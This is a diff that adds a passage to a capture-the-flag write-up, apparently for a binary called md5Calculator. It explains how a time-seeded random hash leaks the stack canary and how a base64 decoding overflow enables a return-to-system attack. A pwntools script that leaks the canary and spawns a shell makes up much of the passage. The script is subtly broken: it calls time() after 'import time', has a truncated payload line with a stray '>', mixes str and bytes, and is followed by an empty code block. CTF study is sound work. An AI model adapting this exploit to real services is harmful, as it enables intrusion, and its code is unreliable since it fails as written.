@@ -75,6 +75,81 @@ temp.send("/bin/sh")
 temp.interactive()
 
 ```
+
+### md5Calculator - Level 2
+
+After putting the binary in Ida, I was given this code:
+
+![image](https://user-images.githubusercontent.com/56035342/219431438-f84c127c-6add-4a04-bf7a-24085ace2648.png)
+
+lets look at the `my_hash` function:
+
+![image](https://user-images.githubusercontent.com/56035342/219431560-8ca3f5ba-5199-4295-aaeb-40b7c9caea1e.png)
+
+As you can see, the `my_hash` function generated 8 random numbers, and does some kind of calculation with the *stack canary*.
+Then the program prints that calculation to us!
+Thats really important, because if we do the reverse of the calculation, we can leak the canary value!
+But how would we do it? all the numbers are pure random numbers generated with a seed which is the current time.
+This is fine,since we can make our exploit generate 8 random numbers at the exact same time as the program does, and 
+this way we can predict the random numbers and extract our `canary` from the equation.
+(note that we would have to run our exploit in the target computer, since we need it to be QUICK)
+Lets look at the process_hash function:
+
+![image](https://user-images.githubusercontent.com/56035342/219432273-225ff525-eab1-4014-aa4c-1ed7527cdc68.png)
+
+We need to enter a `1024` bytes string, then it will. be decoded using base64, and will be copied into the `decoded` variable
+which is just `512` bytes. This can cause a bufferoverflow, since we can enter an input which is less then 1024, but still its decoded
+base64 form will be greater than 512 bytes.
+Then we can enter the leaked cookie, and change `eip` to whatever we want!
+Since the `NX` bit is on, we can't just jump to our shellcode.
+but we can see that there is a `system` call at the end of the `main` function.
+we can use that to our adventage, to spawn a shell!
+The exploit is as follows:
+
+```py
+
+from pwn import *
+import time
+from ctypes import CDLL
+import base64
+
+seed = int(time())
+system_addr = 0x08049187 # end of main
+gbuf_addr = 0x0804b0e0 
+
+p = remote("localhost" , 9002)
+
+libc = CDLL("libc.so.6") #the libc where rand() gets called
+libc.srand(seed)
+rands = []
+
+libc.rand() #garbage
+for i in range(0, 8):
+    rands.append(libc.rand())
+
+hashWithoutCookie = rands[0]+rands[4]+rands[1]-rands[2]+rands[6]-rands[5]+rands[3]
+
+p.recvuntil(b"captcha : ")
+wholeHash = int(p.recvline())
+cookie = (wholeHash - hashWithoutCookie) & 0xffffffff
+p.sendline(str(wholeHash))
+p.recvuntil(b"then paste me!\n")
+sizeOfPayload = 716 #can be achived by printing the length of payload before
+payload = base64.b64encode(b"A" * 512 + p32(cookie) + b"A" * 12 + p32(system_addr)>
+payload += "/bin/sh\00"
+p.sendline(payload)
+
+p.interactive()
+
+```
+
+
+The code:
+
+```py
+
+```
+
 ### Tiny Easy - Level 6
 
 Now we have a program which contains just 4 lines of assembly instructions:
